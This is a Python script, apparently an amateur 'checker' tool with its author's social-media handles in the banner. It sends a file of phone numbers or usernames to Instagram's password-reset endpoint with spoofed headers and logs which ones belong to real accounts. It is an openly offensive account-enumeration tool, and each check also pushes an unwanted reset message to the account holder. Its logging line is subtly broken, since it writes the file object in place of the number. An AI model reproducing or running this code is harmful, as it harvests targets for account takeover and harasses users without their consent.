import requests
import time
from time import sleep
import random
print("pls do not skid this code.. give me credit at least lol..\nany issues tell me\nSnap: NeilWilkes02\nTelegram: @modo247\nI will add proxys soon")

phone = input('> Number File: ')
pb = phone
file = open(pb).read().splitlines()

for file in file:
    url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
    headers = {
        'Accept': '/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Length': '81',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'missing',
        'Host': 'www.instagram.com',
        'Origin': 'https://www.instagram.com/',
        'Referer': 'https://www.instagram.com/accounts/password/reset/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 jr/537.36',
        'X-CSRFToken': 'missing',
        'X-IG-App-ID': '936619743392459',
        'X-IG-WWW-Claim': '0',
        'X-Instagram-AJAX': 'bba907d2f110',
        'X-Requested-With': 'XMLHttpRequest'
}
    data = {
        'email_or_username': file,
        'recaptcha_challenge_field': '',
        'flow': '',
        'app_id': ''
}
    sleep(0.5)
    req = requests.post(url , headers=headers, data=data).text
    

    if '"status":"ok"' in req:
        print(f'Valid | {file}')
        with open ('valid.txt', 'a') as file:
	        file.write (f'{file}\n')

    elif '"message":"No users found"' in req:
        print(f'Invalid')